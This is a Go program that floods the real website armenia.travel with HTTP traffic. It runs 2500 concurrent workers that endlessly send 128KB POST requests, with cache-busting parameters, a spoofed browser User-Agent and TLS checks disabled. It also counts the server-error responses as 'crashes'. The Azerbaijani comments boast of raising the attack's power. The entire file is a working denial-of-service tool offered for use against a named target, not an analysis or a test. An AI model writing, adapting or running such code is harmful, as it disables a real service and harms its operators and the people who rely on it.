package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"
	"sync/atomic"
)

func main() {
	target := "https://armenia.travel/#"
	workers := 2500 // Gücü artırdıq
	
	fmt.Printf("[!!!] HAKAI-GHOST DEVRƏDƏ: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		},
		MaxIdleConns:        20000,
		MaxIdleConnsPerHost: 10000,
		ForceAttemptHTTP2:   true, // HTTP/2 mütləqdir
	}

	client := &http.Client{Transport: tr, Timeout: 7 * time.Second}
	var successCount uint64
	var crashCount uint64

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			payload := "data=" + strings.Repeat("Y", 128000) // Payload-u 128KB-a qaldırdıq
			
			for {
				u := fmt.Sprintf("%s?ts=%d&id=%d", target, time.Now().UnixNano(), rand.Int())
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache, no-store")
				
				resp, err := client.Do(req)
				if err == nil {
					if resp.StatusCode >= 500 {
						atomic.AddUint64(&crashCount, 1)
					} else {
						atomic.AddUint64(&successCount, 1)
					}
					resp.Body.Close()
				}
				// Log limitinə düşməmək üçün hər şeyi çap etmirik
			}
		}(i)
	}

	// Hər 5 saniyədən bir ümumi vəziyyəti göstərən reporter
	go func() {
		for {
			time.Sleep(5 * time.Second)
			fmt.Printf("[REPORT] Cəmi uğurlu: %d | Server Çöküşü (5xx): %d\n", 
				atomic.LoadUint64(&successCount), atomic.LoadUint64(&crashCount))
		}
	}()

	wg.Wait()
}
